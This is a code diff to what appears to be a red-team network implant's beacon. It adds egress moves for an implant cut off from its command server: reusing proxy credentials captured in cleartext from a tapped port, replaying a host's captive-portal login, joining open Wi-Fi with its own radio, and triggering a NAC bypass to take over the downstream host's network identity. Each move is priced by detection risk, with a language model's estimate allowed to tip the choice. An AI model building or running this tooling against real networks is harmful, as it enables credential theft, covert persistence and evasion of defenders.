@@ -31,6 +31,7 @@ import tempfile
 import threading
 import time
 import urllib.error
+import urllib.parse
 import zipfile
 import urllib.request
 from pathlib import Path
@@ -1842,13 +1843,26 @@ def _rescue_class_of(exc: BaseException) -> int:
 # One call, one log line: the first problem found is the one reported, and
 # a stuck implant is not the place to enumerate an operator's typos.
 
-# The three verbs a rule may name, which is the gate the operator cannot
-# widen: configuration selects from this tuple and orders it. `_exec_egress`
-# dispatches exactly these three sub-verbs; a test holds the two together,
+# The verbs a rule may name, which is the gate the operator cannot widen:
+# configuration selects from this tuple and orders it. `_exec_egress`
+# dispatches exactly these sub-verbs; a test holds the two together,
 # because a verb here that the beacon does not have would be a rule that
 # can never fire, and a sub-verb there that is missing here is one the
 # decider cannot reach.
-EGRESS_VERBS = ("proxy", "rediscover", "gsocket")
+#
+# **In cost order, which is the design's backbone.** The first three are
+# rung 2 and are what this file has always had; the last four arrived with
+# the way out. Rung 1 -- observe -- is evidence only and has no verb at
+# all: what it produces is the target a louder rung aims at.
+#
+#   rung 2, borrow      proxy, rediscover, gsocket, credential, portal
+#   rung 3, own radio   radio
+#   rung 4, identity    identity
+#
+# Naming a verb is not reaching it: `_WAY_OUT_RUNG_OF` below prices each
+# one, and the loud rungs are reachable only through that arithmetic.
+EGRESS_VERBS = ("proxy", "rediscover", "gsocket", "credential", "portal",
+                "radio", "identity")
 
 # The flag names a `when` may say, and the bit each one is -- a copy of
 # dns_rescue's FLAG_*, like `_RESCUE_CLASSES` above and for the same reason.
@@ -2202,6 +2216,43 @@ def _egress_check_flag(name: str, where: str) -> None:
             % (where, name, " or ".join(_EGRESS_FLAG_BITS)))
 
 
+def _radio_lease(path: str) -> Tuple[str, int, str]:
+    """`(address, prefix, router)` from a dhclient lease file.
+
+    The lease is read rather than dhclient's script being allowed to act,
+    because that script installs a **default route** -- the one thing the
+    radio rung may never do. So DHCP runs with `-sf /bin/true` and this
+    reads what it wrote.
+
+    An unreadable or incomplete lease answers with empty strings, which the
+    rung treats as a failure and rolls back: a radio with an address and no
+    gateway is a change the operator cannot see.
+    """
+    try:
+        with open(path, "r") as handle:
+            text = handle.read()
+    except OSError:
+        return "", 24, ""
+    address = router = ""
+    prefix = 24
+    for line in text.splitlines():
+        line = line.strip().rstrip(";")
+        if line.startswith("fixed-address "):
+            address = line.split(None, 1)[1].strip()
+        elif line.startswith("option routers "):
+            router = line.split(None, 2)[2].strip().split(",")[0].strip()
+        elif line.startswith("option subnet-mask "):
+            mask = line.split(None, 2)[2].strip()
+            try:
+                bits = sum(bin(int(part)).count("1")
+                           for part in mask.split("."))
+            except ValueError:
+                continue
+            if 0 < bits <= 32:
+                prefix = bits
+    return address, prefix, router
+
+
 # ── The way out: the files the scout and the beacon meet over ──
 #
 # `c2.way_out` of configs/raccoon.yaml. The scout
@@ -2233,6 +2284,59 @@ _WAY_OUT_TAP_FLAGS = {
     "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
     "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
 }
+
+# ── The rungs' prices, copied from software/agent/safety.py's WAY_OUT_TABLE ──
+#
+# `(points, p_success, p_detect)` per row, and a copy for the reason the
+# rescue record is one: this file is served to a target as source text, so
+# `from software.agent import safety` would not resolve there.
+# `test_way_out_gate.py` compares the two and fails when they drift.
+#
+# Not in `gate.Gate` either, and not only because of the import: that class
+# needs a SQLite connection, a `run_id`, an approvals table and an event
+# loop (`gate.py:258-307`), none of which exists on an implant with no
+# channel. What is reproduced here is the inequality and nothing else.
+_WAY_OUT_ROWS = {
+    "way_out_borrow": (20, 0.5, 0.35),
+    "way_out_radio": (20, 0.4, 0.5),
+    "way_out_identity": (20, 0.5, 0.8),
+}
+
+# Which row prices which rung. Rung 1 is evidence only, so it has no row:
+# three rows, four rungs.
+_WAY_OUT_ROW_OF = {
+    2: "way_out_borrow",
+    3: "way_out_radio",
+    4: "way_out_identity",
+}
+
+# Every verb's rung. A verb with no entry here could not be priced, so it
+# would reach the implant's own decision ungated -- which is the hole the
+# first draft of this design left and the reason both the policy path and
+# the model path go through `_way_out_allows`.
+_WAY_OUT_RUNG_OF = {
+    "proxy": 2,
+    "rediscover": 2,
+    "gsocket": 2,
+    "credential": 2,
+    "portal": 2,
+    "radio": 3,
+    "identity": 4,
+}
+
+# The rungs the three verbs this file has always had live on. With
+# `c2.way_out` off, those verbs behave exactly as they do today -- no
+# arithmetic, no new refusal -- and anything above this rung is refused
+# with a reason. That is the distribution rule: the ladder arrives with
+# the scout, and a build without one keeps today's behaviour.
+_WAY_OUT_UNGATED_RUNG = 2
+
+# A model's probability estimate is advisory. The span is
+# `safety.clamp_llm_adjustment`'s, copied with the floor and ceiling that
+# keep a clamped value a probability.
+_WAY_OUT_CLAMP_SPAN = 0.2
+_WAY_OUT_P_MIN = 0.01
+_WAY_OUT_P_MAX = 0.99
 
 _WAY_OUT_BLOCK_KEYS = ("enabled", "state_dir", "document_max_age_seconds",
                        "points_per_hour", "points_max", "risk_coefficient",
@@ -2779,6 +2883,30 @@ class _HttpSession:
             if "proxy" in str(e.reason).lower() or "tunnel" in str(e.reason).lower():
                 raise _ProxyError(str(e.reason)) from e
             raise
+
+    def post_raw(self, url: str, body: bytes, headers: dict,
+                 timeout: float = 30) -> "_HttpResponse":
+        """POST bytes as they are, with the content type the caller names.
+
+        `post` above serialises JSON, which is what every leg of this
+        beacon sends. The captive-portal rung sends a form body it did not
+        compose -- it replays exactly what the scout saw the host send --
+        so it needs the bytes passed through unchanged.
+
+        An HTTP error status is an answer and not an exception here, as it
+        is in `post`: a portal that refuses is the thing the rung has to
+        report.
+        """
+        req = urllib.request.Request(url, data=body, method="POST")
+        for key, value in headers.items():
+            req.add_header(key, value)
+        opener = self._build_opener()
+        try:
+            resp = opener.open(req, timeout=timeout)
+            return _HttpResponse(resp.getcode(), resp.read())
+        except urllib.error.HTTPError as e:
+            return _HttpResponse(e.code,
+                                 e.read() if hasattr(e, "read") else b"")
 
     def head(self, url: str, timeout: float = 10) -> "_HttpResponse":
         req = urllib.request.Request(url, method="HEAD")
@@ -6251,6 +6379,11 @@ class Beacon:
         self._way_out_enabled = way_out.get("enabled") is True
         self._way_out_state_dir = (self._way_out.get("state_dir") or ""
                                    if self._way_out_enabled else "")
+        # Rung 4's latch. Once per deployment, and deliberately **not**
+        # reset by `_leg_recovered`: it is the one move here that cannot be
+        # undone from the far side, so a second outage does not get a
+        # second attempt at it. Re-arming it is a new deployment.
+        self._way_out_identity_spent = False
 
         # ── the egress decider ──
         #
@@ -9612,14 +9745,22 @@ class Beacon:
             return self._egress_select_proxy(target)
         if action == "gsocket":
             return self._egress_gsocket()
-        # The three forms in full rather than the bare words, as
-        # `_exec_tunnel` names both of its own: an operator who typed
-        # `egress transport smb` needs to read what does exist, and the
-        # likeliest wrong guesses are verbs the beacon really has under
-        # other keys.
+        if action == "credential":
+            return self._egress_credential(target)
+        if action == "portal":
+            return self._egress_portal()
+        if action == "radio":
+            return self._egress_radio(target)
+        if action == "identity":
+            return self._egress_identity()
+        # The forms in full rather than the bare words, as `_exec_tunnel`
+        # names both of its own: an operator who typed `egress transport
+        # smb` needs to read what does exist, and the likeliest wrong
+        # guesses are verbs the beacon really has under other keys.
         return ("[error] Unknown egress action %r: it is 'egress "
-                "rediscover', 'egress proxy <index|url>' or 'egress "
-                "gsocket'" % action)
+                "rediscover', 'egress proxy <index|url>', 'egress gsocket', "
+                "'egress credential [index|account]', 'egress portal', "
+                "'egress radio [ssid]' or 'egress identity'" % action)
 
     def _proxy_prohibited(self) -> bool:
         """Whether this build was told to connect directly and not to proxy.
@@ -9803,7 +9944,381 @@ class Beacon:
                 "test of the leg: the next check-in through the forward is"
                 % (pid, self.gsocket_local_port))
 
+    # ── Rung 2: borrow what the host proves works ──
+    #
+    # Two verbs the tap made possible. Both read `way_out_borrow.json`,
+    # which the scout writes 0600 and which is the only file here that can
+    # carry a secret -- which is why it is not the document the beacon
+    # reads every cycle. Neither tests its own result.
+
+    def _egress_borrow(self, what: str) -> Tuple[Optional[dict], str]:
+        """The scout's private half, or a refusal naming what is missing."""
+        if not self._way_out_state_dir:
+            return None, ("[error] Not borrowing %s: c2.way_out is off on "
+                          "this build, so no scout is watching the tapped "
+                          "port and there is nothing to borrow. Nothing was "
+                          "changed." % what)
+        try:
+            with open(self._way_out_path(_WAY_OUT_BORROW_NAME), "rb") as f:
+                loaded = json.loads(f.read().decode("utf-8"))
+        except (OSError, ValueError, UnicodeDecodeError) as exc:
+            return None, ("[error] Not borrowing %s: the scout's %s could "
+                          "not be read (%s). Nothing was changed."
+                          % (what, _WAY_OUT_BORROW_NAME, exc))
+        if not isinstance(loaded, dict):
+            return None, ("[error] Not borrowing %s: the scout's %s is not a "
+                          "document. Nothing was changed."
+                          % (what, _WAY_OUT_BORROW_NAME))
+        return loaded, ""
+
+    def _egress_credential(self, target: str) -> str:
+        """Borrow a credential the host handed over in the clear.
+
+        What it changes: the proxy this implant posts through, and the
+        account it authenticates as. That is the answer to a `407` -- the
+        one failure class the rescue record carries that nothing in this
+        implant could previously act on.
+
+        **The secret is never printed.** The answer names the account and
+        the proxy, because that is what an operator needs to recognise what
+        the implant did and what may lock out.
+        """
+        if self._proxy_prohibited():
+            return self._proxy_prohibition(
+                "borrowing a credential the tap captured")
+        borrow, refusal = self._egress_borrow("a credential")
+        if borrow is None:
+            return refusal
+        entries = [entry for entry in (borrow.get("credentials") or [])
+                   if isinstance(entry, dict)]
+        usable = [entry for entry in entries
+                  if entry.get("secret") and entry.get("user")
+                  and entry.get("where")]
+        if not usable:
+            # Said as what it is. An NTLM or Negotiate header is a
+            # challenge-response and carries no password to borrow, so a
+            # verb that selected one would spend an attempt on a
+            # credential with an empty secret.
+            kinds = sorted({str(entry.get("kind", "?")) for entry in entries})
+            return ("[error] Not borrowing a credential: the scout has "
+                    "captured %d, none of them usable%s. A proxy-NTLM or "
+                    "proxy-Negotiate header is a challenge-response and "
+                    "carries no password. Nothing was changed."
+                    % (len(entries),
+                       " (" + ", ".join(kinds) + ")" if kinds else ""))
+
+        chosen = None
+        if not target:
+            chosen = usable[0]
+        elif target.isdecimal():
+            index = int(target)
+            if not 1 <= index <= len(usable):
+                return ("[error] There is no usable credential %s: the scout "
+                        "has %d, numbered 1 to %d."
+                        % (target, len(usable), len(usable)))
+            chosen = usable[index - 1]
+        else:
+            for entry in usable:
+                if entry.get("user") == target:
+                    chosen = entry
+                    break
+            if chosen is None:
+                return ("[error] %r is not an account the scout captured, "
+                        "and this verb selects only from what it did. "
+                        "Nothing was changed." % target)
+
+        url = "http://%s:%s@%s" % (urllib.parse.quote(chosen["user"], safe=""),
+                                   urllib.parse.quote(chosen["secret"],
+                                                      safe=""),
+                                   chosen["where"])
+        # A new session rather than the old one's `proxies` rewritten, for
+        # the reason `_egress_select_proxy` gives: `_https_post` reads
+        # `_proxy_session` once into a local, so swapping the object cannot
+        # change an opener a request is in the middle of building.
+        session = _HttpSession()
+        self._proxy_session = session
+        session.proxies = {"http": url, "https": url}
+        return ("Credential borrowed: this implant now posts through %s as "
+                "%s (%s, seen by the scout on the tapped port). Not a test "
+                "of it: the next check-in through that proxy is"
+                % (chosen["where"], chosen["user"], chosen["kind"]))
+
+    def _egress_portal(self) -> str:
+        """Answer a captive portal the way the host answered it.
+
+        One request, replaying exactly what the scout saw the host send and
+        get past. It reports the status it got and nothing more: a portal
+        that answers 200 has not proved this implant can reach the team
+        server, and the next check-in is what does.
+        """
+        borrow, refusal = self._egress_borrow("a captive portal's answer")
+        if borrow is None:
+            return refusal
+        portal = borrow.get("portal")
+        if not isinstance(portal, dict):
+            return ("[error] Not answering a captive portal: the scout has "
+                    "not seen the host get past one, so there is nothing to "
+                    "replay. Nothing was changed.")
+        url = portal.get("url")
+        body = portal.get("body")
+        if (not isinstance(url, str) or not url.startswith("http://")
+                or not isinstance(body, str)):
+            return ("[error] Not answering a captive portal: the scout's "
+                    "record of it is %r, which this verb cannot replay. "
+                    "Nothing was changed." % (portal,))
+        content_type = portal.get("content_type") or \
+            "application/x-www-form-urlencoded"
+        session = self._proxy_session or _HttpSession()
+        try:
+            response = session.post_raw(
+                url, body.encode("utf-8"),
+                {"Content-Type": content_type}, timeout=20)
+        except Exception as exc:
+            return ("[error] The captive portal at %s could not be answered: "
+                    "%s. Nothing was changed." % (url, exc))
+        return ("Captive portal answered at %s, as the host answered it; it "
+                "replied %d. Not a test of the way out: the next check-in is"
+                % (url, response.status_code))
+
+    # ── Rung 3: the implant's own radio ──
+    #
+    # An open SSID, which leaves the tapped port altogether. Three bounds,
+    # and each is in the code below rather than in a comment: the **onboard**
+    # radio only, because a USB adapter is refused on the 13 W power budget
+    # (`hardware/OPEN_QUESTIONS.md:184`); a **time-boxed** association; and
+    # a **scoped** route -- a table of its own plus a source rule -- so that
+    # this never becomes the host's default route. An implant that stranded
+    # itself off the path it still has is the predecessor design's hardest
+    # anti-goal, which is why a failure rolls back every command it ran.
+
+    # Its own routing table and nothing else's. 100 because the kernel's own
+    # names stop at 255 and local/main/default occupy 255/254/253.
+    _RADIO_TABLE = "100"
+    # The association and the lease, each in seconds. Short on purpose: this
+    # runs on the beacon thread, and a `dhclient` that never returned would
+    # cost the implant its loop.
+    _RADIO_TIMEOUT = 30
+
+    def _radio_run(self, argv: List[str], timeout: int = 30):
+        """One command, as `(returncode, output)`. Never raises.
+
+        The seam the radio rung is tested through, and the shape
+        `nac_bypass.py` already runs its own `ebtables` and `ip` with.
+        """
+        try:
+            done = subprocess.run(argv, capture_output=True, text=True,
+                                  timeout=timeout)
+        except (OSError, subprocess.SubprocessError) as exc:
+            return 1, str(exc)
+        return done.returncode, (done.stdout or "") + (done.stderr or "")
+
+    def _radio_iface(self) -> Tuple[Optional[str], str]:
+        """The onboard wireless interface, or None and why not.
+
+        USB is refused rather than preferred, and the reason is the power
+        budget rather than tidiness: 802.3af gives this device about 13 W
+        and it is already bridging and capturing. Raspberry Pi's own note
+        on that class of HAT says it is not quite enough to power the
+        hungriest USB peripherals at the same time, and
+        `hardware/OPEN_QUESTIONS.md` adds: this board is that case.
+        """
+        usb = []
+        try:
+            names = sorted(os.listdir(_SYSFS_NET))
+        except OSError as exc:
+            return None, "the interface list could not be read: %s" % exc
+        for name in names:
+            iface = os.path.join(_SYSFS_NET, name)
+            if not os.path.exists(os.path.join(iface, "wireless")):
+                continue
+            device = os.path.realpath(os.path.join(iface, "device"))
+            if "usb" in device.lower():
+                usb.append(name)
+                continue
+            return name, ""
+        if usb:
+            return None, ("%s is a USB adapter and the 13 W PoE budget "
+                          "refuses one: this device is already bridging and "
+                          "capturing on it" % ", ".join(usb))
+        return None, "no wireless interface on this host"
+
+    def _egress_radio(self, target: str) -> str:
+        """Associate with an open SSID and route this implant's own traffic.
+
+        The SSIDs come from the scout's document -- the radio is the scout's
+        to scan, and a beacon that scanned for itself would be a second
+        reader of the same hardware. Without a fresh document there is
+        nothing to associate with and the verb declines.
+        """
+        iface, problem = self._radio_iface()
+        if iface is None:
+            return ("[error] Not using this implant's own radio: %s. Nothing "
+                    "was changed." % problem)
+        document = self._way_out_document()
+        if document is None:
+            return ("[error] Not using this implant's own radio: there is no "
+                    "fresh scout document, so no SSID has been seen. "
+                    "Nothing was changed.")
+        seen = [entry for entry in
+                ((document.get("tap") or {}).get("ssids") or [])
+                if isinstance(entry, dict) and entry.get("ssid")]
+        openly = [entry["ssid"] for entry in seen if entry.get("open")]
+        if target:
+            if target not in openly:
+                return ("[error] %r is not an SSID the scout saw open: it "
+                        "saw %s. This verb associates with an open network "
+                        "only -- there is no credential here for a closed "
+                        "one. Nothing was changed."
+                        % (target, ", ".join(
+                            "%s (%s)" % (e["ssid"],
+                                         "open" if e.get("open") else "closed")
+                            for e in seen) or "none"))
+            ssid = target
+        elif openly:
+            ssid = openly[0]
+        else:
+            return ("[error] Not using this implant's own radio: the scout "
+                    "saw %s and none of them open. Nothing was changed."
+                    % (", ".join(entry["ssid"] for entry in seen) or "no "
+                       "SSID at all"))
+
+        def step(argv):
+            code, output = self._radio_run(argv, timeout=self._RADIO_TIMEOUT)
+            if code != 0:
+                return output or ("%s exited %d" % (argv[0], code))
+            return ""
+
+        failure = step(["ip", "link", "set", iface, "up"])
+        if failure:
+            return self._radio_rollback(
+                iface, None, "%s could not be brought up: %s"
+                % (iface, failure))
+
+        failure = step(["iw", "dev", iface, "connect", ssid])
+        if failure:
+            return self._radio_rollback(
+                iface, None, "the association with %r failed: %s"
+                % (ssid, failure))
+
+        lease = self._way_out_path("way_out_radio.lease") \
+            if self._way_out_state_dir else \
+            os.path.join(tempfile.gettempdir(), "way_out_radio.lease")
+        # `-1` is one attempt and then give up, and `-sf /bin/true` is the
+        # whole point: dhclient's default script installs a **default
+        # route**, which is the one thing this rung may never do.
+        failure = step(["dhclient", "-1", "-sf", "/bin/true", "-lf", lease,
+                        iface])
+        if failure:
+            return self._radio_rollback(
+                iface, None, "DHCP on %s failed: %s" % (iface, failure))
+        address, prefix, router = _radio_lease(lease)
+        if not address or not router:
+            return self._radio_rollback(
+                iface, None, "the DHCP lease named no address and gateway "
+                             "this rung could use")
+
+        failure = step(["ip", "addr", "add", "%s/%d" % (address, prefix),
+                        "dev", iface])
+        if failure:
+            return self._radio_rollback(
+                iface, None, "%s could not be given %s: %s"
+                % (iface, address, failure))
+
+        failure = step(["ip", "route", "add", "default", "via", router,
+                        "dev", iface, "table", self._RADIO_TABLE])
+        if failure:
+            return self._radio_rollback(
+                iface, address, "the scoped route could not be installed: %s"
+                % failure, prefix=prefix)
+        failure = step(["ip", "rule", "add", "from", address, "table",
+                        self._RADIO_TABLE])
+        if failure:
+            return self._radio_rollback(
+                iface, address, "the source rule could not be installed: %s"
+                % failure, prefix=prefix, table=True)
+        return ("Radio associated: %s on %s as %s, with its default route in "
+                "table %s and a source rule for %s -- this implant's own "
+                "traffic only, and never the host's. Not a test of the way "
+                "out: the next check-in is"
+                % (ssid, iface, address, self._RADIO_TABLE, address))
+
+    def _radio_rollback(self, iface: str, address: Optional[str],
+                        problem: str, prefix: int = 24,
+                        table: bool = False) -> str:
+        """Undo every step this attempt took, in reverse, and say why.
+
+        Part of the rung and not a follow-up: a half-configured radio is
+        an interface with an address and no route, which is a change the
+        operator cannot see and cannot undo from the far side.
+        """
+        if table or address:
+            self._radio_run(["ip", "route", "flush", "table",
+                             self._RADIO_TABLE], timeout=self._RADIO_TIMEOUT)
+        if address:
+            self._radio_run(["ip", "rule", "del", "from", address, "table",
+                             self._RADIO_TABLE], timeout=self._RADIO_TIMEOUT)
+            self._radio_run(["ip", "addr", "del", "%s/%d" % (address, prefix),
+                             "dev", iface], timeout=self._RADIO_TIMEOUT)
+        self._radio_run(["iw", "dev", iface, "disconnect"],
+                        timeout=self._RADIO_TIMEOUT)
+        self._radio_run(["ip", "link", "set", iface, "down"],
+                        timeout=self._RADIO_TIMEOUT)
+        return ("[error] Not using this implant's own radio: %s. Every step "
+                "taken has been rolled back and %s is down." % (problem,
+                                                                iface))
+
+    # ── Rung 4: take an identity, which this repository already does ──
+
+    def _egress_identity(self) -> str:
+        """Ask `main.py` to start the NAC bypass it already carries.
+
+        A trigger and not an implementation: `software/nac_bypass.py`
+        forwards EAPOL so the downstream device stays authenticated, learns
+        its MAC, IP and the gateway's MAC from the bridge, and originates
+        this implant's traffic under that identity. It ships disabled and
+        runs as a component of `main.py`, which is a **different process**
+        from this one -- so this writes one request file and that process
+        acts on it.
+
+        **One-shot per deployment.** A move that can turn the port off does
+        not get retried on a hunch, however the arithmetic looks on the next
+        cycle, and `_leg_recovered` deliberately does not re-arm it.
+
+        **Pre-spent when the operator already enabled the bypass**: the
+        identity was taken at boot, and offering the rung again would spend
+        an attempt on something already done.
+        """
+        if self._way_out_identity_spent:
+            return ("[error] Not taking the host's identity: this implant "
+                    "has asked once already, and the rung is once per "
+                    "deployment -- it is the one move that can end this "
+                    "implant's connectivity for good. Nothing was changed.")
+        document = self._way_out_document()
+        if document is None:
+            return ("[error] Not taking the host's identity: there is no "
+                    "fresh scout document, and whether the bypass is "
+                    "already running is a fact only the scout reads. The "
+                    "safe answer to an unknown is not to make the one "
+                    "irreversible move. Nothing was changed.")
+        if document.get("identity_pre_spent"):
+            return ("[error] Not taking the host's identity: this build's "
+                    "nac_bypass.enabled is true, so the identity was taken "
+                    "at boot and the rung is already spent. Nothing was "
+                    "changed.")
+        self._way_out_identity_spent = True
+        self._way_out_write(_WAY_OUT_IDENTITY_NAME, {
+            "version": _WAY_OUT_STATE_VERSION,
+            "requested": time.time(),
+            "stuck_cycles": self._stuck_cycles,
+        })
+        return ("Identity requested: the implant has asked its own main "
+                "process to start nac_bypass, which forwards EAPOL and then "
+                "originates this implant's traffic as the downstream host. "
+                "Once per deployment. Not a test of the way out: the next "
+                "check-in is")
+
     # ── Deciding to get out, when nobody can be asked ──
+
     #
     # The three verbs above are what an operator, or the team server's
     # model through `try_egress`, sends a stuck implant. This is what the
@@ -10060,12 +10575,154 @@ class Beacon:
             return None
         return advice
 
+    # ── The ladder, which is arithmetic and not a policy line ──
+    #
+    # `points * p_success > risk_coefficient * p_detect`, the inequality
+    # `gate.py:361-363` uses, with the two terms that move on a dark
+    # implant:
+    #
+    #   * **`points` grows with time dark.** `points` is the value of what
+    #     the action unlocks, and that value is not constant: a channel
+    #     restored in the first hour is worth a check-in, and one restored
+    #     after a week is the difference between an operation and a dead
+    #     device in a rack. This is the human's stated appetite -- dark is
+    #     useless -- as a number rather than as a rule that fires.
+    #   * **`p_detect` moves with the evidence.** `dot1x_seen` raises the
+    #     identity rung's; `portal_answered` lowers the borrow rung's.
+    #
+    # With `points` fixed and the priors in the table, the inequality would
+    # be a *constant per rung*, decided when the table was authored: either
+    # high enough that the loudest rung always passes, in which case the
+    # gate orders nothing, or low enough that it never fires. The server's
+    # moving term -- `effective_p_detect`, which climbs with a campaign's
+    # detection count -- has no analogue here.
+    #
+    # **Both paths go through this.** The policy evaluator and the scout's
+    # recommendation alike; a gate only the model honoured would have left
+    # the no-model fallback reaching the loud rungs ungated.
+
+    def _way_out_points(self) -> int:
+        """The value of a restored channel, at this much time dark.
+
+        Floored to whole hours: the curve is a statement about how long
+        this implant has been useless, and half an hour is not an hour.
+        """
+        hours = int(self._way_out_hours_dark())
+        return min(int(self._way_out["points_max"]),
+                   int(_WAY_OUT_ROWS[_WAY_OUT_ROW_OF[2]][0])
+                   + int(self._way_out["points_per_hour"]) * hours)
+
+    def _way_out_clamp(self, prior: float, proposed) -> float:
+        """Bound an advisory probability to +-0.2 around the prior.
+
+        A copy of `safety.clamp_llm_adjustment`, for the reason the rows
+        above are copies. A proposal that is not a finite number is
+        discarded in favour of the prior, which is the same stance
+        `read_egress_policy` takes toward a rule it cannot read.
+        """
+        try:
+            value = float(proposed)
+        except (TypeError, ValueError):
+            return prior
+        if value != value:          # NaN, without importing math
+            return prior
+        value = max(prior - _WAY_OUT_CLAMP_SPAN,
+                    min(prior + _WAY_OUT_CLAMP_SPAN, value))
+        return max(_WAY_OUT_P_MIN, min(_WAY_OUT_P_MAX, value))
+
+    def _way_out_allows(self, verb: str, p_success=None) -> Tuple[bool, dict]:
+        """Whether this rung may be taken now, and the numbers behind it.
+
+        The numbers come back whatever the answer, because they are what
+        the trail carries: a decision nobody can reconstruct is worse than
+        a policy, since the policy at least names the rule that matched.
+
+        Never raises: this is consulted on the beacon thread inside a loop
+        with no guard of its own.
+        """
+        rung = _WAY_OUT_RUNG_OF.get(verb)
+        if rung is None:
+            # A verb with no price. Refused rather than allowed, which is
+            # the only safe default: the alternative is an unpriced move on
+            # a device nobody can reach.
+            return False, {"rung": 0, "row": "", "allowed": False,
+                           "why": "`egress %s` has no rung, so nothing "
+                                  "prices it and it is refused" % verb}
+        if not self._way_out_enabled:
+            if rung <= _WAY_OUT_UNGATED_RUNG:
+                # Exactly today's behaviour: the three verbs the decider
+                # has always had, ordered by the operator's policy and
+                # bounded by its budget.
+                return True, {"rung": rung, "row": "", "allowed": True,
+                              "why": "rung %d, which this build has always "
+                                     "allowed its decider" % rung}
+            return False, {
+                "rung": rung, "row": _WAY_OUT_ROW_OF[rung], "allowed": False,
+                "why": "rung %d needs the arithmetic that prices it, and "
+                       "c2.way_out is off on this build, so it is refused "
+                       "rather than taken unpriced" % rung}
+
+        row = _WAY_OUT_ROW_OF[rung]
+        _, prior_success, prior_detect = _WAY_OUT_ROWS[row]
+        points = self._way_out_points()
+        detect = self._way_out_detect(rung, prior_detect)
+        success = (self._way_out_clamp(prior_success, p_success)
+                   if p_success is not None else prior_success)
+        coefficient = float(self._way_out["risk_coefficient"])
+        threshold = float(self._way_out["ev_threshold"])
+        ev = points * success - coefficient * detect
+        ev_prior = points * prior_success - coefficient * detect
+        allowed = ev > threshold
+        numbers = {
+            "rung": rung,
+            "row": row,
+            "hours_dark": round(self._way_out_hours_dark(), 2),
+            "points": points,
+            "p_success": success,
+            "p_success_prior": prior_success,
+            "p_detect": detect,
+            "p_detect_prior": prior_detect,
+            "risk_coefficient": coefficient,
+            "threshold": threshold,
+            "ev": ev,
+            "ev_prior": ev_prior,
+            "allowed": allowed,
+            # Marked the way `override_decisive` marks it on the server, so
+            # the trail says which decisions rested on a model's estimate
+            # rather than on the table.
+            "override_decisive": allowed and not ev_prior > threshold,
+        }
+        numbers["why"] = (
+            "rung %d (%s): %d points * %.2f p_success = %.1f against %.0f * "
+            "%.2f p_detect = %.1f, so EV %.1f %s threshold %.1f"
+            % (rung, row, points, success, points * success, coefficient,
+               detect, coefficient * detect, ev,
+               "exceeds" if allowed else "does not exceed", threshold))
+        return allowed, numbers
+
+    def _way_out_detect(self, rung: int, prior: float) -> float:
+        """`p_detect` for this rung, moved by the evidence.
+
+        One modifier per rung and no more, because each says something true
+        of that rung alone: a port that authenticates is watched, so taking
+        its identity is likelier to be noticed; a network that redirects
+        every browser sees credential prompts answered all day, so
+        borrowing one is less likely to be.
+        """
+        detect = float(prior)
+        flags = self._egress_state()["flags"]
+        if rung == 4 and "dot1x_seen" in flags:
+            detect += float(self._way_out["dot1x_detect"])
+        if rung == 2 and "portal_answered" in flags:
+            detect += float(self._way_out["portal_detect"])
+        return max(_WAY_OUT_P_MIN, min(_WAY_OUT_P_MAX, detect))
+
     def _way_out_hours_dark(self) -> float:
         """How long this outage has lasted, in hours, from the cycle count.
 
         The beacon's own interval and not a clock: `_stuck_cycles` is the
         one measure of an outage this process keeps, it survives nothing it
-        should not, and a wall clock would make the curve below depend on
+        should not, and a wall clock would make the curve above depend on
         an NTP a dropped implant cannot reach.
         """
         return (self._stuck_cycles * max(1, int(self.interval))) / 3600.0
@@ -10272,7 +10929,7 @@ class Beacon:
         number, rule = chosen
         return {"verb": rule["try"], "chose": "policy", "rule": number,
                 "argument": "", "p_success": None,
-                "why": "when %s" % (rule["when"],)}
+                "why": "rule %d (when %s)" % (number, rule["when"])}
 
     def _egress_proxy_target(self) -> Optional[str]:
         """Which discovered proxy to select, or None if there is none to.
@@ -10355,11 +11012,24 @@ class Beacon:
             return False
         if self._egress_spent >= self._egress_budget:
             return False
-        chosen = self._egress_evaluate(self._egress_state())
+        chosen = self._egress_choose(self._egress_state())
         if chosen is None:
             return False
-        number, rule = chosen
-        task = self._egress_task(rule["try"])
+        verb = chosen["verb"]
+        # The gate, before the budget and before the attempt. A rung the
+        # arithmetic refuses costs nothing: an attempt spent on a refusal
+        # the numbers guarantee is an attempt the quieter rungs do not get,
+        # which is the same call `_egress_usable` makes about a proxy verb
+        # on a build that forbids proxies.
+        allowed, numbers = self._way_out_allows(verb, chosen.get("p_success"))
+        if not allowed:
+            logger.warning(
+                "Egress decider: %s chose `egress %s` after %d stuck "
+                "cycle(s), and the arithmetic refuses it -- %s. Nothing was "
+                "attempted and no budget was spent",
+                chosen["chose"], verb, self._stuck_cycles, numbers["why"])
+            return False
+        task = self._egress_task(verb)
         if task is None:
             return False
 
@@ -10375,18 +11045,35 @@ class Beacon:
             # dispatch answering the same way, and it is the operator who
             # reads both.
             outcome = "[exception: %s]" % exc
-        # One line, and everything an operator needs from it: which rule
-        # of their file it was and what that rule says, the verb as they
-        # would have typed it, what this window has now spent, and what
-        # came back. The outcome is the verb's own answer, which is
+        # One line, and everything an operator needs from it: what chose
+        # and why, the verb as they would have typed it, the rung and the
+        # numbers that let it through, what this window has now spent, and
+        # what came back. The outcome is the verb's own answer, which is
         # deliberately about what was *changed* and not about whether the
         # implant can now get out -- the next cycle's legs report that.
         logger.warning(
             "Egress decider: no upstream leg has delivered for %d cycles, so "
-            "rule %d (when %s) chose `egress %s` -- attempt %d of %d in this "
+            "the %s chose `egress %s` (%s)%s -- attempt %d of %d in this "
             "stuck window. It answered: %s",
-            self._stuck_cycles, number, rule["when"], task,
+            self._stuck_cycles, chosen["chose"], task, chosen["why"],
+            ", allowed by " + numbers["why"] if numbers.get("row") else "",
             self._egress_spent, self._egress_budget, outcome)
+        # The trail's line, into the one file this project writes. It
+        # outlives this window: the scout copies it onto `way_out_trail`,
+        # which is what makes a burned implant a lesson instead of a
+        # mystery.
+        self._way_out_record_attempt({
+            "chose": chosen["chose"],
+            "rule": chosen["rule"],
+            "why": chosen["why"],
+            "verb": verb,
+            "task": task,
+            "gate": numbers,
+            "spent": self._egress_spent,
+            "budget": self._egress_budget,
+            "evidence": self._egress_state(),
+            "outcome": outcome,
+        })
         return True
 
     # ── AV / EDR enumeration ──
